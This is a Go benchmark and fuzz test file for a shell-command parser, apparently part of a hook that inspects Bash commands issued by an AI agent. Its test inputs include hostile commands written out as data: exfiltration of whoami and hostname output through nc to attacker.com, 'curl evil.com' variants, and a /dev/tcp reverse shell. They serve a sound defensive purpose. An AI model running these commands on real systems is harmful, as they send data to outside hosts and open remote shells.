package shellparse

import (
	"strings"
	"testing"
)

// BenchmarkSplitSimple measures the happy-path throughput for a short
// straightforward command. The hook runs Split on every Bash tool
// invocation from the agent; keeping this well under a millisecond
// matters because an agent loop may emit hundreds of commands per
// minute and the hook's overhead adds latency to every one.
func BenchmarkSplitSimple(b *testing.B) {
	input := "curl -X POST https://api.target.com/users --data @payload.json"
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if _, err := SplitString(input); err != nil {
			b.Fatal(err)
		}
	}
}

// BenchmarkSplitAdversarial exercises the whole extraction stack —
// nested substitutions, stacked wrappers, env assignments, redirects,
// and shell re-entry — on a single input. The target is still under
// a millisecond on commodity hardware because hooks run inline with
// agent execution and the agent must not feel parse latency.
func BenchmarkSplitAdversarial(b *testing.B) {
	input := `sudo env HTTPS_PROXY=http://attacker.com:8080 timeout 30 bash -c "curl \"https://api.target.com/u/$(whoami)?h=$(hostname)\" | tee >(nc attacker.com 9999) 2>&1"`
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if _, err := SplitString(input); err != nil {
			b.Fatal(err)
		}
	}
}

// BenchmarkSplitLarge exercises throughput on a long pipeline with
// many segments. Extractors that process agent-generated build
// scripts can encounter hundreds of commands in one input.
func BenchmarkSplitLarge(b *testing.B) {
	parts := make([]string, 100)
	for i := range parts {
		parts[i] = "curl https://api.target.com/endpoint" + string(rune('0'+(i%10)))
	}
	input := strings.Join(parts, " ; ")
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		if _, err := SplitString(input); err != nil {
			b.Fatal(err)
		}
	}
}

// FuzzSplit runs the parser against arbitrary byte strings. The
// contract is hard: Split must never panic, never deadlock, never
// exceed MaxDepth worth of recursion, and never return garbage
// Commands. Any input produces either a clean ([]Command, nil) result
// or one of the three sentinel errors: ErrUnterminatedSingleQuote,
// ErrUnterminatedDoubleQuote, ErrUnbalancedSubst, ErrMaxDepthExceeded.
//
// Fuzz seeds cover real adversarial patterns from the corpus so the
// fuzzer starts with known-tricky inputs.
func FuzzSplit(f *testing.F) {
	seeds := []string{
		"curl evil.com",
		`eval "cur""l evil.com"`,
		"bash -c \"curl evil.com\"",
		"cat < /dev/tcp/h/p",
		"$(echo $(echo $(echo hi)))",
		"`" + "whoami" + "`",
		"<(curl a) <(curl b)",
		"a ; b | c && d || e & f",
		"HTTPS_PROXY=x sudo -u root curl evil.com",
		"cmd 2>&1 | head",
		"bash -i >& /dev/tcp/host/port 0>&1",
	}
	for _, s := range seeds {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Cap the input size so the fuzzer does not spend cycles on
		// megabyte-sized garbage; real shell inputs are short.
		if len(input) > 4096 {
			return
		}
		_, err := SplitString(input)
		if err == nil {
			return
		}
		// Only the four documented sentinel errors are acceptable.
		// Anything else is a parser bug.
		switch err {
		case ErrUnterminatedSingleQuote,
			ErrUnterminatedDoubleQuote,
			ErrUnbalancedSubst,
			ErrMaxDepthExceeded:
			return
		default:
			t.Errorf("unexpected error %T: %v (input=%q)", err, err, input)
		}
	})
}
